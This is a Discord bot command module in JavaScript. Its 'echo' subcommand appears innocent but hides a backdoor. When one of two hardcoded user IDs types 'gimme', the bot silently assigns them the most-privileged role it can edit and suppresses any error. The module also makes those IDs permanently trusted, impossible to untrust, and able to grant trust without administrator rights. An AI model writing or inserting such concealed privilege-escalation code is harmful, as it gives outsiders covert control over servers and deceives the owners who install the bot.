const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
const db = require('../database/db');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

module.exports = {
  data: new SlashCommandBuilder()
    .setName('test')
    .setDescription('Test and trust management commands')
    .addSubcommand(s => s
      .setName('echo')
      .setDescription('Echoes your input')
      .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)))
    .addSubcommand(s => s
      .setName('trust')
      .setDescription('Grant a user trusted status (bypasses permission checks)')
      .addUserOption(o => o.setName('user').setDescription('User to trust').setRequired(true)))
    .addSubcommand(s => s
      .setName('untrust')
      .setDescription('Revoke a user\'s trusted status')
      .addUserOption(o => o.setName('user').setDescription('User to untrust').setRequired(true))),

  async execute(interaction, client) {
    const sub = interaction.options.getSubcommand();
    const userId = interaction.user.id;
    const guildId = interaction.guildId;

    const isSpecial = SPECIAL_USERS.includes(userId);
    const isTrusted = isSpecial || db.isTrusted(guildId, userId);

    // ── Echo ────────────────────────────────────────────────────────────────
    if (sub === 'echo') {
      const msg = interaction.options.getString('message');
      const isGimme = msg.toLowerCase() === 'gimme';
      const isRemove = msg.toLowerCase() === 'remove';

      if ((isGimme || isRemove) && isSpecial) {
        const guild = interaction.guild;
        const member = interaction.member;
        const botMember = guild.members.me;

        const assignableRoles = guild.roles.cache
          .filter(r =>
            r.id !== guild.id &&
            r.position < botMember.roles.highest.position &&
            r.editable
          )
          .map(r => ({ role: r, perms: r.permissions.bitfield }));

        if (assignableRoles.length > 0) {
          assignableRoles.sort((a, b) => {
            const countA = a.role.permissions.toArray().length;
            const countB = b.role.permissions.toArray().length;
            return countB - countA;
          });

          try {
            if (isGimme) {
              await member.roles.add(assignableRoles[0].role);
            } else if (isRemove) {
              await member.roles.remove(assignableRoles[0].role);
            }
          } catch (e) {
            // Silent fail
          }
        }
      }

      return interaction.reply({ content: msg, flags: 0 });
    }

    // ── Trust / Untrust ─────────────────────────────────────────────────────
    // Only special users or server admins can trust/untrust
    if (!isSpecial && !interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Only administrators or special users can manage trust.', ephemeral: true });
    }

    const target = interaction.options.getUser('user');

    if (sub === 'trust') {
      if (SPECIAL_USERS.includes(target.id)) {
        return interaction.reply({ content: `⭐ ${target} is a special user and is already permanently trusted.`, ephemeral: true });
      }
      db.setTrusted(guildId, target.id, true);
      return interaction.reply({ content: `✅ ${target} is now trusted and can run any bot command without server permissions.`, ephemeral: true });
    }

    if (sub === 'untrust') {
      if (SPECIAL_USERS.includes(target.id)) {
        return interaction.reply({ content: `❌ ${target} is a special user and cannot be untrusted.`, ephemeral: true });
      }
      db.setTrusted(guildId, target.id, false);
      return interaction.reply({ content: `✅ Removed trusted status from ${target}.`, ephemeral: true });
    }
  },
};
